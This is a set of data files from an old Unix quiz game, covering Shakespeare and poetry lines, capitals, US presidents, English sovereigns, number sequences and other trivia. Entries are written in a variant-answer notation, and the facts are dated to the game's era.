Neither a borrower nor a lender be:\
For loan oft loses both itself and friend{.}:\
Hamlet{ I-iii}:\
Polonius
To be{,} or not to be{\:}:\
that is the question{\:}:\
Hamlet{ III-i}:\
Hamlet
Alas{,} poor Yorick{!}:\
I knew him{,} Horatio{;}:\
Hamlet{ V-i}:\
Hamlet
Double{,} double toil and trouble{;}:\
Fire burn and cauldron bubble{.}:\
Macbeth{ IV-i}:\
Witch{es}
By the pricking of my thumbs{,}:\
Something wicked this way comes{.}:\
Macbeth{ IV-i}:\
Out, damned spot! out, I say!:\
:\
Macbeth{ V-i}:\
Lady Macbeth
[Second |2nd |]Witch
Unbidden guests:\
Are often welcomest when they are gone{.}:\
{King }Henry VI{,} Part I{ I-ii}:\

She is a woman{,} therefore may be woo'd{;}:\
She is a woman{,} therefore may be [won|screw'd]{.}:\
Titus Andronicus{ II-i}:\
Demetrius
Such duty as the subject owes the prince{,}:\
Even such a woman oweth to her husband{.}:\
{The }Taming of the Shrew{ V-ii}:\
Kate
Who is Silvia{?} what is she{,}:\
That all our swains commend her{?}:\
{The }Two Gentlemen of Verona{ IV-ii}:\
Thurio
Tu-whit{,} tu-who[ - | |--]a merry note{,}:\
While greasy Joan doth keel the pot{.}:\
Love's Labo{u}r Lost{ V-ii}:\
Winter
My only love sprung from my only hate{!}:\
Too early seen unknown{,} and known too late{!}:\
Romeo and Juliet{ I-v}:\
Juliet
But{,} soft{!} what light through yonder window breaks{?}:\
It is the east{,} and Juliet is the sun{!}:\
Romeo and Juliet{ II-ii}:\
Romeo
What's in a name{?} That which we call a rose:\
By any other name would smell as sweet{.}:\
Romeo and Juliet{ II-ii}:\
Juliet
Good night{,} good night{!} parting is such sweet sorrow{,}:\
That I shall say good night till it be morrow{.}:\
Romeo and Juliet{ II-ii}:\
Juliet
A plague o['|n] both your houses{!}:\
They have made worms' meat of me{.}:\
Romeo and Juliet{ III-i}:\
Mercutio
This royal throne of kings{,} this scepter['|e]d isle{,}:\
This earth of majesty{,} this seat of Mars{,}:\
{King }Richard II{ II-i}:\
John of Gaunt
Not all the water in a rough rude sea:\
Can wash the balm from an anointed king{.}:\
{King }Richard II{ III-ii}:\
{King }Richard II
I'll put a girdle round the earth:\
In forty minutes{.}:\
{A }Midsummer[-| ]Night's Dream{ II-i}:\
Puck
I can call spirits from the vasty deep{.}:\
Why{,} so can I{,} or so can any man{;}:\
{King }Henry IV{,} Part I{ II-iv}:\

There are more things in heaven and earth{,} Horatio{,}:\
Than are dream[t|ed] of in your philosophy{.}:\
Hamlet{ I-v}:\
Hamlet
The time is out of joint{;} O cursed spite{,}:\
That ever I was born to set it right{!}:\
Hamlet{ I-v}:\
Hamlet
Once more unto the breach{,} dear friends{,} once more{;}:\
Or close the wall up with our English dead{.}:\
{King }Henry V{ III-i}:\
{King }Henry V
Was ever woman in this humour woo['|e]d{?}:\
Was ever woman in this humour [won|screw'd]{?}:\
{King }Richard III{ I-ii}:\
{King }Richard III
Now is the winter of our discontent:\
Made glorious summer by this sun of York:\
{King }Richard III{ I-i}:\
{King }Richard III
There['s| is] a divinity that shapes our ends{,}:\
Rough[-| ]hew them how we will{.}:\
Hamlet{ V-ii}:\
Hamlet
There is a tide in the affairs of men:\
Which{,} taken at the flood{,} leads on to fortune{;}:\
Julius Caesar{ IV-iii}:\
Brutus
Never{,} never{,} never{,} never{,} never{.}:\
Pray you undo this button{.}{ Thank you{,} sir{.}}:\
{King }Lear{ V-iii}:\
{King }Lear
I grow{,} I prosper{\:}:\
Now{,} gods{,} stand up for bastards{!}:\
{King }Lear{ I-ii}:\
Edmund
The better part of valour is discretion{;}:\
in the which better part I have saved my life{.}:\
{King }Henry IV{,} Part I{ V-iv}:\
Falstaff
Asses are made to bear{,} and so are you{.}:\
Women are made to bear{,} and so are you{.}:\
{The }Taming of the Shrew{ II-i}:\

Full fathom five thy father lies{;}:\
Of his bones are coral made{;}:\
{The }Tempest{ I-ii}:\
Ariel
She lov['|e]d me for the dangers I had pass['|e]d{;}:\
And I lov['|e]d her that she did pity them{.}:\
Othello{ I-iii}:\
Othello
Uneasy lies the head that wears a crown{.}:\
Many good morrows to your Majesty{!}:\
{King }Henry IV{,} Part II{ III-i}:\

Mislike me not for my complexion{,}:\
The shadow['|e]d livery of the burnish['|e]d sun{.}:\
{The }Merchant of Venice{ II-i}:\
Morocco
Cowards die many times before their deaths{;}:\
The valiant never taste of death but once{.}:\
Julius Caesar{ II-ii}:\
Caesar
O{h}{!|,} Pardon me{,} thou bleeding piece of earth{,}:\
That I am meek and gentle with these butchers{.}:\
Julius Caesar{ III-i}:\
{Mark }Antony
The play's the thing:\
Wherein I'll catch the conscience of the king{.}:\
Hamlet{ II-ii}:\
Hamlet
How sharper than a serpent's tooth it is:\
to have a thankless child{.}:\
{King }Lear{ I-iv}:\
{King }Lear
Had I but served my God with half the zeal I served my king:\
He would not in [mine|my] old age have left me naked to [mine|my] enemies{.}:\
{King }Henry VIII{ IV-ii}:\
{Cardinal }Wolsey
It seems she hangs upon the cheek of night:\
Like a rich jewel in an Ethiop's ear{.}:\
Romeo and Juliet{ I-v}:\
Romeo
Where the bee sucks{,} there suck I{;}:\
In a cowslip's bell I lie{.}:\
{The }Tempest{ V-i}:\
Ariel
O brave new world{,}:\
That has such people [in't|in it]{!}:\
{The }Tempest{ V-i}:\
Miranda
Why{,} then the world's mine oyster{,}:\
Which I with sword will open{.}:\
{The }Merry Wives of Windsor{ II-ii}:\
Falstaff
A goodly apple rotten at the heart{\:}:\
O{h}{,} what a goodly outside falsehood hath{!|.}:\
{The }Merchant of Venice{ I-iii}:\
Antonio
I never kill['|e]d a mouse{,} nor hurt a fly{;}:\
I trod upon a worm against my will{,}:\
Pericles{ IV-i}:\
Marina
Golden lads and girls all must{,}:\
Like chimney sweepers{,} come to dust{.}:\
Cymbeline{ IV-ii}:\
Guiderius
You blocks, you stones, you worse than senseless things!:\
O you hard hearts{,} you cruel men of Rome{.}:\
Julius Caesar{ I-i}:\
Marullus
A horse[!|,|] a horse[!|,|] my kingdom for a horse[!|]:\
:\
{King }Richard III{ V-iv}:\
{King }Richard III
My salad days,:\
When I was green in judg[e|]ment, cold in blood[,|]:\
Antony [and|&] Cleopatra{ I-v}:\
Cleopatra
Age cannot wither her, nor custom stale:\
Her infinite variety[.|]:\
Antony [and|&] Cleopatra{ II-iii}:\
Enobarbus
Give me some music\: music, moody food:\
Of us that trade in love[.|]:\
Antony [and|&] Cleopatra{II-v}:\
Cleopatra
'Tis better playing with a lion's whelp,:\
Than with an old one dying[.|]:\
Antony [and|&] Cleopatra:\
Enobarbus
The barge she sat in, like a burnished throne,:\
Burned on the water[.|] The poop was burnished gold[;|.|]:\
Antony [and|&] Cleopatra:\
Enobarbus
-- /usr/lib/quiz/collectives mode=0100664 uid=3 gid=3 atime=169848923 mtime=169259236 --
ants:colony|hill
apes:shrewdness
asses:pace|bunch
badgers:cete
bass:shoal
bears:sloth
bees:swarm
birds:dissimulation
brats:passel
candidates:slate
caterpillars:army
cats:clowder
cattle:drove|herd
chickens:peep|flock
crows:murder
curs:cowardice
dogs:pack
doves:dule
ducks:[pad|ba]dling
earthquakes:swarm
eggs:clutch
elephants:herd
elk:gang
ferrets:business
finches:charm
firemen:brigade
fish:school
foxes:skulk
geese in flight:skein
geese on water:gaggle
goats:trip
hawks:cast
hens:brood
herons:siege
horses:haras|team
hounds:kennel
jellyfish:smack
kangaroos|monkeys:troop
kittens:kindle
lapwings:deceit
larks:exaltation|bevy
leopards:leap
lions:pride
locusts:plague
magpies:tidings
maidens|quail:bevy
martens:richness
men:band
moles:labor
monkeys|kangaroos:troop
mountains:range
mules:barren|baren
nightingales:watch
operating companies:at&t|bell system
owls:parliament
partridges|grouse:covey
peacocks:ostentation
pheasants:bouquet
plovers:congregation
ponies:string
prisoners:gang
pups:litter
quail|maidens:bevy
rabbits:nest
ravens:unkindness
rhinoceroses:crash
roebucks:bevy
rooks:building
seals:pod
sheep:flock
ships:fleet
snipe:walk|wisp
sparrows:host
squirrels:dray
starlings:murmuration
stars:constellation
storks:mustering
swallows:flight
teal:spring
toads:knot
turkeys:rafter
turtledoves:pitying
whales:gam|pod
witches:coven
wolves:route
woodcocks:fall
woodpeckers:descent
{wild }swine:sounder
-- /usr/lib/quiz/europe mode=0100664 uid=3 gid=3 atime=169848925 mtime=169259236 --
Albania:Tirana|Tirane"
Andorra:Andorra la V[ell|iej]a
Austria:Vienna|Wien
Belgium:Brussel[s|]|Bruxelles
Bulgaria:Sofi[a|ya]
Czechoslovakia:Prague|Praha
Denmark:Copenhagen|K[o|o/]benhavn
East Germany:Berlin
England|United Kingdom|Great Britain|UK:London
Finland:Helsinki
France:Paris
Greece:Athens
Hungary:Budapest
Iceland:Reykjavik
Ireland|Eire:Dublin
Italy:Rom[e|a]
Liechtenstein:Vaduz
Luxembourg:Luxembourg
Malta:Valletta
Monaco:Monte Carlo
Netherlands|Holland:The Hague|'sGravenhage|den Haag
Norway:Oslo
Poland:Wars[aw|zawa]
Portugal:Lisbo[n|a]
R[u|o]mania:Bucharest|Bucuresti
San Marino:San Marino
Spain:Madrid
Sweden:Stockholm
Switzerland:Bern|Berne
Turkey:Ankara
USSR|Russia:Mos[cow|kva]
[West |]Germany:Bonn
Yugoslavia:Belgrade|Beograd
-- /usr/lib/quiz/inca mode=0100664 uid=3 gid=3 atime=169848927 mtime=169259236 --
manco capac:sinchi roca
sinchi roca:lloque yupanqui
lloque yupanqui:mayta capac
mayta capac:capac yupanqui
capac yupanqui:inca roca
inca roca:yahuar huacac
yahuar huacac:viracocha
viracocha:pachacuti
pachacuti:tupa inca yupanqui
tupa inca yupanqui:huayna capac
huayna capac:huascar
huascar:atahuallpa
-- /usr/lib/quiz/index mode=0100664 uid=3 gid=3 atime=170481203 mtime=169259237 --
/usr/lib/quiz/state:state:cap[ital|]:abbr[ev[iation|]|]
/usr/lib/quiz/america:[country-|]America:cap[ital|]
/usr/lib/quiz/europe:[country-|]Europe:cap[ital|]
/usr/lib/quiz/africa:[country-|]Africa:cap[ital|]
/usr/lib/quiz/midearth:[country-|]M[iddle-Earth|E]:cap[ital|]
/usr/lib/quiz/pres:pres[ident|]:term:succ[essor|]
/usr/lib/quiz/sov:sov[ereign|]:cen[t[ury|]|]:succ[essor|]
/usr/lib/quiz/seq-easy:seq[uence|]-easy:next:name
/usr/lib/quiz/seq-hard:seq[uence|]-hard:next:name
/usr/lib/quiz/posneg:pos[itive|]:neg[ative|]
/usr/lib/quiz/bard:Shakespeare[-line[s|]|]|line[s|]:next:work:char{acter}
/usr/lib/quiz/inca:inca:succ[essor|]
/usr/lib/quiz/murders:victim:killer
/usr/lib/quiz/collectives:ind{ividuals}:coll{ective}
/usr/lib/quiz/misspell:mis{spell}:right
/usr/lib/quiz/poetry:poem-line:next:poem:author
-- /usr/lib/quiz/midearth mode=0100664 uid=3 gid=3 atime=169848931 mtime=169259237 --
Shire:Michel Delving|Hobbiton
Mordor:Minas Morgul
Gondor:Minas Tirith
Umbar:{City of the }Corsairs
Rhovanion:Esgaroth{ upon the Long Lake}
Rohan:Edoras
Lothl['o|o|o']rien:Caras Galadon
Breeland:Bree
Arnor:Ann['u|u'|u]minas
Arthedain:Fornost{ Erain}|Norbury of the Kings
-- /usr/lib/quiz/misspell mode=0100664 uid=3 gid=3 atime=169848932 mtime=169259237 --
Wate for me at the gate.:wait
No, he couldn't go eather.:either
Speak softly, plese.:please
Does the horse kik high?:kick
John never told a ly:lie
Poor cloun, he hasn't any friends!:clown
No scool today, it's snowing.:school
Cawl the kids in out of the rain.:call
When the clock strikes, it will be sevin.:seven
Corn flackes are better than puffed wheat.:flakes
The pear was biten in half.:bitten
That towel gets you only haf dry.:half
The keeper feeds the bares at eight.:bears
The son went behind a cloud.:sun
Did you see the monky at the zoo?:monkey
-- /usr/lib/quiz/murders mode=0100664 uid=3 gid=3 atime=169848935 mtime=169848601 --
Cock Robin:{the }sparrow
sleep|Duncan:Macbeth
{the }cat:curiosity|care
{John {F{.} }}Kennedy|JFK:{Lee Harvey }Oswald|{the }FBI|{the }CIA
{Lee Harvey }Oswald:{Jack }Ruby|{the }FBI|{the }CIA
{Martin Luther }King:{James {Earl }}Ray|{the }FBI|{the }CIA
[Bobby |Robert {F{.} }]Kennedy|RFK:{Sirhan }Sirhan|{the }FBI|{the }CIA
Christ:{the }Romans|{Pontius }Pilate
{Sharon }Tate:{Charles }Manson
Charles Lindbergh Jr{.}:{Bruno }Hauptman{n}
{Mr{.} }{{and }Mrs{.} }Borden|{her }parents:Lizzie{ Borden}
{Prof{essor} }{James }Moriarty:{Sherlock }Holmes
Achilles:Paris
Abel:Cain
{the }nurses:{Richard }Speck
{J{.} |Julius }Caesar:Brutus{ et al.}
Pompeii:Vesuvius
{Abraham |Abe }Lincoln:{John {Wilkes }}Booth
{Yukio }Mishima:{Yukio }Mishima
{Alexander }Hamilton:{Aaron }Burr
Cleopatra:{the |an }asp
[Ann Boleyn|Catharine Howard]:Henry{ VIII}
vaudeville:{the }movies|film
{the }movies|film:TV|television
-- /usr/lib/quiz/poetry mode=0110664 uid=3 gid=3 atime=169848937 mtime=169259237 --
Come live with me and be my love:\
And we will all the pleasures prove:\
{The }Passionate Shepherd{ to his Love}:\
{Christopher }Marlowe
Shall I compare thee to a summer's day{?}:\
Thou art more lovely and more temperate:\
Sonnet 18:\
{William }Shakespeare
Fine knacks for ladies, cheap, choice, brave, and new!:\
Good pennyworths{! }but money cannot move:\
Fine Knacks{ for Ladies}:\
{John }Dowland
My mind to me a kingdom is:\
Such perfect joy therein I find:\
My Mind to Me a Kingdom Is:\
{Sir }{Edward }Dyer
Underneath this stone doth lie:\
As much beauty as could die:\
Epitaph on Elizabeth{,} {L. H.}:\
{Ben }Jonson
Death be not proud, though some have called thee:\
Mighty and dreadful{,} for thou art not so:\
{Holy }Sonnet{s}{ 10}:\
{John }Donne
Gather ye rose-buds while ye may:\
Old Time is still a-flying:\
To the Virgins{,} {To Make Much of Time}:\
{Robert }Herrick
Why so pale and wan, fond lover?:\
Prithee{,} why so pale{?}:\
Song:\
{Sir }{John }Suckling
Stone walls do not a prison make:\
Nor iron bars a cage:\
To Althea{,} From Prison:\
{Richard }Lovelace
I saw Eternity the other night:\
Like a great ring of pure and endless light:\
{The }World:\
{Henry }Vaughan
Come and trip it as you go,:\
On the light fantastic toe:\
L'Allegro:\
{John }Milton
When I consider how my light is spent:\
Ere half my days in this dark world and wide:\
On His Blindness|When I Consider:\
{John }Milton
The grave's a fine and private place{,}:\
But none{,} I think{,} do there embrace{.}:\
To His Coy Mistress:\
{Andrew }Marvel
Great wits are sure to madness near allied:\
And thin partitions do their bounds divide:\
Absalom and Achitophel|Absalom:\
{John }Dryden
A little learning is a dangerous thing{;}:\
Drink deep{,} or taste not the Pierian spring{.}:\
{An }Essay on Criticism|{On }Criticism:\
{Alexander }Pope
The curfew tolls the knell of parting day{,}:\
The lowing herd wind slowly o'er the lea:\
Elegy{ Written in a Country Church{-| }Yard:\
{Thomas }Gray
The best laid schemes o' mice an' men gang aft a-gley{,}:\
An{'|d} lea{'|v}e us nought but grief an{'|d} pain for promised joy{.}:\
To a Mouse:\
{Robert }Burns
Tiger! tiger! burning bright!:\
In the forests of the night:\
{The }Tiger:\
{William }Blake
My heart leaps up when I behold:\
A rainbow in the sky:\
My Heart Leaps Up:\
{William }Wordsworth
The world is too much with us; late and soon{,}:\
Getting and spending{,} we lay waste our powers:\
{The }World is Too Much With Us|Sonnet:\
{William }Wordsworth
A sadder and a wiser man{,}:\
He rose the morrow morn:\
{The }{Rime of }{The }Ancient Mariner:\
{Samuel }{Taylor }Coleridge
In Xanadu did Kubla Khan:\
A stately pleasure{-| }dome decree:\
Kubla Khan:\
{Samuel }{Taylor }Coleridge
She walks in beauty, like the night:\
Of cloudless climes and starry skies:\
She Walks in Beauty:\
{George Gordon, }{Lord }Byron
I want a hero- an uncommon want{,}:\
When every year and month sends forth a new one:\
Don Juan{ Canto I}:\
{George Gordon, }{Lord }Byron
A thing of beauty is a joy forever.:\
Its loveliness increases{;|.} {it will never/Pass into nothingness}:\
Endymion{ Book I}:\
{John }Keats
Matched with an aged wife, I mete and dole:\
Unequal laws unto a savage race:\
Ulysses:\
{Alfred{,} }{Lord }Tennyson
He will hold thee, when his passion shall have spent its novel force{,}:\
Something better than his dog{,} a little dearer than his horse:\
Locksley Hall:\
{Alfred{,} }{Lord }Tennyson
'Tis better to have loved and lost:\
Than never to have loved at all:\
{In }Memoriam{ A. H. H.}:\
{Alfred{,} }{Lord }Tennyson
Oh, to be in England:\
Now that April's there:\
Home{-| }Thoughts{,} From Abroad:\
{Robert }Browning
Ah, but a man's reach should exceed his grasp{,}:\
Or what's a heaven for{?}:\
Andrea Del Sarto:\
{Robert }Browning
How do I love thee? Let me count the ways.:\
I love thee to the depth and breadth and height:\
Sonnet{s} {From the Portuguese}{ 43}:\
{Elizabeth }{Barrett }Browning
A Book of Verses underneath the Bough{,}:\
A Jug of Wine, a Loaf of Bread{-|,| }and Thou:\
{The }Rubaiyat{ of Omar Khayyam}{ 12}:\
{Edward }Fitzgerald
The Moving Finger writes; and, having writ,:\
Moves on{\:|,|.} nor all your Piety nor Wit:\
{The }Rubaiyat{ of Omar Khayyam}{ 71}:\
{Edward }Fitzgerald
Ah Love! could you and I with Him conspire:\
To grasp this sorry Scheme of Things entire:\
{The }Rubaiyat{ of Omar Khayyam}{ 99}:\
{Edward }Fitzgerald
Remember me when I am gone away,:\
Gone far away into the silent land:\
Remember:\
{Christina }Rossetti
Home is the sailor, home from the sea,:\
And the hunter home from the hill:\
Requiem:\
{Robert }{Louis }Stevenson
I fled Him, down the nights and down the days;:\
I fled Him, down the arches of the years:\
{The }Hound of Heaven:\
{Francis }Thompson
So 'ere's to you, Fuzzy-Wuzzy, at your 'ome in the Soudan;:\
You're a {pore|poor} benighted {'|h}eathen but a first class fightin{'|g} man:\
Fuzzy{-| }Wuzzy:\
{Rudyard }Kipling
Morns abed and daylight slumber:\
Were not meant for man alive:\
Reveille:\
{A{.}{ }E{.}{ }}Houseman
I will arise and go now, and go to Innisfree,:\
And a small cabin build there{,} of clay and wattles made:\
{The }{Lake Isle of }Innisfree:\
{William }{Butler }Yeats
I must go down to the seas again, to the lonely sea and the sky,:\
And all I ask is a tall ship and a star to steer her by:\
Sea{-| }Fever:\
{John }Masefield
April is the cruelest month, breeding:\
Lilacs out of the dead land:\
{The }Waste{ }Land:\
{T{.}{ }S{.}{ }}Eliot
Now as I was young and easy under the apple boughs:\
About the little house and happy as the grass was green:\
Fern Hill:\
{Dylan }Thomas
-- /usr/lib/quiz/posneg mode=0100664 uid=3 gid=3 atime=169848939 mtime=169259237 --
large|big:small
on:off
standing up:sitting down
inside:outside
high:low
old:new|young
hot:cold
out:in
heavy|dark:light
daytime:night[time| time]
stop|come:go
top:bottom
floor:ceiling
near:far
run:walk
empty|hungry:full
backwards:f[or|ront]wards
big|large:little|small
fat|thick:thin|skinny
bright|light:dark|dull
right:wrong|left
give:take|receive|get
buy:sell
shiny|bright:dull
dawn:dusk
fall down|go to bed:[get|stand|rise] up
asleep:awake
up:down
open[|ed|]:close[d|]
smile:frown|cry
happy|glad:sad
hard:soft|easy
boy|woman|lady:girl|man
fast:slow
wet:dry
covered|hid[den|]:uncovered|open
good:bad
always|sometimes|now:never|sometimes
beautiful|pretty:ugly
rough:smooth
hairy:bald||smooth
above:below
yin:yang
sweet:sour
if:unless
from|fro:to
with[|in|]:without|against
after:before
together:apart
plus:minus
-- /usr/lib/quiz/pres mode=0100664 uid=3 gid=3 atime=169848941 mtime=169259237 --
{G{eorge} }Washington:1789-{17}97:{J{ohn} }Adams
{J{ohn} }Adams:1797-1801:{T{homas} }Jefferson
{T{homas} }Jefferson:1801-{{18}0}9:{J{ames} }Madison
{J{ames} }Madison:1809-{18}17:{J{ames} }Monroe
{J{ames} }Monroe:1817-1825:{J{ohn} }{Q{uincy} }Adams
{J{ohn} }{Q{uincy} }Adams:1825-{{18}2}9:{A{ndrew} }Jackson
{A{ndrew} }Jackson:1829-{18}37:{M{artin} }Van Buren
{M{artin} }Van Buren:1837-{18}41:{W{illiam|m} }{H{enry} }Harrison
{W{illiam|m} }{H{enry} }Harrison:1841:{J{ohn} }Tyler
{J{ohn} }Tyler:1841-{{18}4}5:{J{ames} }{K{nox} }Polk
{J{ames} }{K{nox} }Polk:1845-{{18}4}9:{Z{achary} }Taylor
{Z{achary} }Taylor:1849-{18}50:{M{illard} }Fillmore
{M{illard} }Fillmore:1850-{{18}5}3:{F{ranklin} }Pierce
{F{ranklin} }Pierce:1853-{{18}5}7:{J{ames} }Buchanan
{J{ames} }Buchanan:1857-{18}61:{A{braham|be} }Lincoln
{A{braham|be} }Lincoln:1861-{{18}6}5:{A{ndrew} }Johnson
{A{ndrew} }Johnson:1865-{{18}6}9:{U{lysses} }{S{impson} }Grant
{U{lysses} }{S{impson} }Grant:1869-{18}77:{R{utherford} }{B{irchard} }Hayes
{R{utherford} }{B{irchard} }Hayes:1877-{18}81:{J{ames} }{A{bram} }Garfield
{J{ames} }{A{bram} }Garfield:1881:{C{hester} }{A{lan} }Arthur
{C{hester} }{A{lan} }Arthur:1881-{{18}8}5:{G{rover} }Cleveland{ (1st term)}
{G{rover} }Cleveland{ (1st term)}:1885-{{18}8}9:{B{enjamin} }Harrison
{B{enjamin} }Harrison:1889-{18}93:{G{rover} }Cleveland{ (2nd term)}
{G{rover} }Cleveland{ (2nd term)}:1893-{18}97:{W{illiam|m} }McKinley
{W{illiam|m} }McKinley:1897-1901:{T{heodore|eddy} }Roosevelt|TR
{T{heodore|eddy} }Roosevelt|TR:1901-{{19}0}9:{W{illiam|m} }{H{oward} }Taft
{W{illiam|m} }{H{oward} }Taft:1909-{19}13:{W{oodrow} }Wilson
{W{oodrow} }Wilson:1913-{19}21:{W{arren} }{G{amaliel} }Harding
{W{arren} }{G{amaliel} }Harding:1921-{{19}2}3:{C{alvin} }Coolidge
{C{alvin} }Coolidge:1923-{{19}2}9:{H{erbert} }Hoover
{H{erbert} }Hoover:1929-{19}33:{F{ranklin} }{D{elano} }Roosevelt|FDR
{F{ranklin} }{D{elano} }Roosevelt|FDR:1933-{19}45:{H{arry} }{S }Truman
{H{arry} }{S }Truman:1945-{19}53:{D{wight} }{D{avid} }Eisenhower
{D{wight} }{D{avid} }Eisenhower:1953-{19}61:{J{ohn} }{F{itzgerald} }Kennedy|JFK
{J{ohn} }{F{itzgerald} }Kennedy|JFK:1961-{{19}6}3:{L{yndon} }{B{aines} }Johnson|LBJ
{L{yndon} }{B{aines} }Johnson|LBJ:1963-{{19}6}9:{R{ichard} }{M{ilhouse} }Nixon
{R{ichard} }{M{ilhouse} }Nixon:1969-{19}74:{G{erald} }{R{obert} }Ford
{G{erald} }{R{obert} }Ford:1974-:
-- /usr/lib/quiz/seq-easy mode=0100664 uid=3 gid=3 atime=169848944 mtime=169259237 --
1,2,3,4,5,6:7{(integers)}:integers|[natural|counting] numbers
1,2,3,5,8,13:21{(Fibonacci)}:Fibonacci{ seq{ence}| numbers}
1,2,4,8,16,32:64{(powers of 2)}:powers of 2|2[**|^]n
1,2,6,24,120,720:5040{(factorials)}:factorials|n!
1,3,5,7,9,11:13{(odd nos.)}:odd [integ|numb]ers
1,3,6,10,15,21:28{(triangular)}:triangular{ numbers}|C(n,2)
1,3,9,27,81:243{(powers of 3)}:powers of 3|3[**|^]n
1,4,9,16,25:36{(squares)}:squares|n[**|^]2
1,4,16,64:256{(powers of 4)}:powers of 4|4[**|^]n
1,5,25,125:625{(powers of 5)}:powers of 5|5[**|^]n
1,8,27,64,125:216{(cubes)}:cubes|n[**|^]3
2,3,5,7,11,13:17{(primes)}:prime[ number]s
2,4,6,8,10,12:14{(even nos.)}:even [integ|numb]ers|multiples of 2|2n
3,6,9,12,15:18{(3n)}:multiples of 3|3n
-- /usr/lib/quiz/seq-hard mode=0100664 uid=3 gid=3 atime=169848945 mtime=169259237 --
1,1,2,1,2,2,3,1,2,2,3,2,3,3,4:1{(1's in binary nos)}:number of 1's in binary numbers
1,1,2,2,4,2,6,4,6,4,10:4{(phi(n))}:Euler's [totient|phi]{ function}|phi(n)
1,2,2,4,2,4,2,4,6,2:6{(diff of primes)}:diff{erences} [between|of] primes
1,2,4,11,34:156{(unlabeled graphs)}:{unlabeled }graphs
1,2,5,14,42,132:429{(Catalan)}:Catalan{ numbers}
1,2,5,16,61:272{(Euler)}:Euler{ numbers}
1,3,12,60,360:2520{(n!/2)}:Even permutations|n!/2
1,3,16,125,1296,16807:262144{(n**(n-2))}:{labeled }trees|n[**|^](n-2)
1,4,10,20,35,56:84{(C(n,3))}:Tetrahedral{ numbers}|C(n,3)
1,4,11,20,31,44,61:100{(n**2 base 8)}:[Squares|n[**|^]2} base 8|octal squares
1,4,16,256:65536{(2**2**n)}:{labeled }boolean functions|2[**|^]2[**|^]n
1,6,28:496{(perfect nos)}:perfect{ numbers}
2,7,1,8,2,8:1{(e)}:{digits of }e
3,1,4,1,5,9:2{(pi)}:{digits of }pi
3,7,31,127:8191{(Mersenne primes)}:Mersenne{ primes}
-- /usr/lib/quiz/sov mode=0100664 uid=3 gid=3 atime=169848947 mtime=169259237 --
W[illia|]m [I|1|the Conqueror]:11:W[illia|]m [II|2|Rufus|the Red]
W[illia|]m [II|2|Rufus|the Red]:11:Hen[ry|] [I|1]
Hen[ry|] [I|1]:12:Stephen
Stephen:12:Hen[ry|] [II|2]
Hen[ry|] [II|2]:12:Rich[ard|] [I|1]
Rich[ard|] [I|1]:12:John
John:13|12-13:Hen[ry|] [III|3]
Hen[ry|] [III|3]:13:Ed[w[ard|]|] [I|1]
Ed[w[ard|]|] [I|1]:13-14|13|14:Ed[w[ard|]|] [II|2]
Ed[w[ard|]|] [II|2]:14:Ed[w[ard|]|] [III|3]
Ed[w[ard|]|] [III|3]:14:Rich[ard|] [II|2]
Rich[ard|] [II|2]:14:Hen[ry|] [IV|4] Part 1
Hen[ry|] [IV|4] Part 1:15|14-15:Hen[ry|] [IV|4] Part 2
Hen[ry|] [IV|4] Part 2:15|14-15:Hen[ry|] [V|5]
Hen[ry|] [V|5]:15:Hen[ry|] [VI|6]
Hen[ry|] [VI|6]:15:Ed[w[ard|]|] [IV|4]
Ed[w[ard|]|] [IV|4]:15:Ed[w[ard|]|] [V|5]
Ed[w[ard|]|] [V|5]:15:Rich[ard|] [III|3]
Rich[ard|] [III|3]:15:Hen[ry|] [VII|7]
Hen[ry|] [VII|7]:15-16|15|16:Hen[ry|] [VIII|8]
Hen[ry|] [VIII|8]:16:Ed[w[ard|]|] [VI|6]
Ed[w[ard|]|] [VI|6]:16:Mary
Mary:16:Eliz[abeth|][ [I|1]|]
Elizabeth[ [I|1]|]:16-17|16:Ja[me|]s [I|1]
Ja[me|]s [I|1]:17:Cha[rle|]s [I|1]
Cha[rle|]s [I|1]:17:[Oliver |]Cromwell
[Oliver |]Cromwell:17:Rich[ard|] Cromwell
Rich[ard|] Cromwell:17:Ch[arle|]s [II|2]
Cha[rle|]s [II|2]:17:Ja[me|]s [II|2]
Ja[me|]s [II|2]:17:W[illia|]m and Mary
W[illia|]m and Mary:17-18|17:Anne
Anne:18:Geo[rge|] [I|1]
Geo[rge|] [I|1]:18:Geo[rge|] [II|2]
Geo[rge|] [II|2]:18:Geo[rge|] [III|3]
Geo[rge|] [III|3]:18-19|18|19:Geo[rge|] [IV|4]
Geo[rge|] [IV|4]:19:W[illia|]m [IV|4]
W[illia|]m [IV|4]:19:Victoria
Victoria:19:Ed[w[ard|]|] [VII|7]
Ed[w[ard|]|] [VII|7]:19-20|19|20:Geo[rge|] [V|5]
Geo[rge|] [V|5]:20:Ed[w[ard|]|] [VIII|8]
Ed[w[ard|]|] [VIII|8]:20:Geo[rge|] [VI|6]
Geo[rge|] [VI|6]:20:Eliz[abeth|] [II|2]
-- /usr/lib/quiz/state mode=0100664 uid=3 gid=3 atime=170481237 mtime=169259237 --
Alabama|Ala|AL:Montgomery:AL
Alaska|AK:Juneau:AK
Arizona|Ariz|AZ:Phoenix:AZ
Arkansas|Ark|AR:Little Rock:AR
Cal[if[ornia|]|]|CA:Sacramento:CA
Col[o[rado|]|]|CO:Denver:CO
Conn[ecticut|]|CT:Hartford:CT
Del[aware|]|DE:Dover:DE
Fl[orid|]a|FL:Tallahassee:FL
Georgia|Ga:Atlanta:GA
Hawaii|HI:Honolulu:HI
Idaho|Ida|IO:Boise:IO
Ill[inois|]|IL:Springfield:IL
Ind[iana|]|IN:Indianapolis:IN
Iowa|Ia:Des Moines:IA
Kans[as|]|Kan|KS:Topeka:KS
Kentucky|Ky:Frankfort:KY
Louisiana|La:Baton Rouge:LA
Maine|Me:Augusta:ME
Maryland|Md:Annapolis:MD
Mass[achusetts|]|MA:Boston:MA
Mich[igan|]|MI:Lansing:MI
Minn[esota|]|MN:Saint Paul|St Paul:MN
Miss[issippi|]|MS:Jackson:MS
Missouri|Mo:Jefferson City:MO
Mont[ana|]|MT:Helena:MT
Nebraska|Neb|NB:Lincoln:NB
Nevada|Nev|NV:Carson City:NV
New Hampshire|NH:Concord:NH
New Jersey|NJ:Trenton:NJ
New Mexico|NM:Santa Fe:NM
New York|NY:Albany:NY
N[orth|] Carolina|NC:Raleigh:NC
N[orth|] Dakota|ND:Bismarck:ND
Ohio|O|OH:Columbus:OH
Oklahoma|Okla|OK:Oklahoma City:OK
Oregon|Ore|OR:Salem:OR
Pennsylvania|Pa:Harrisburg:PA
Rhode Island|RI:Providence:RI
S[outh|] Carolina|SC:Columbia:SC
S[outh|] Dakota|SD:Pierre:SD
Tenn[essee|]|TN:Nashville:TN
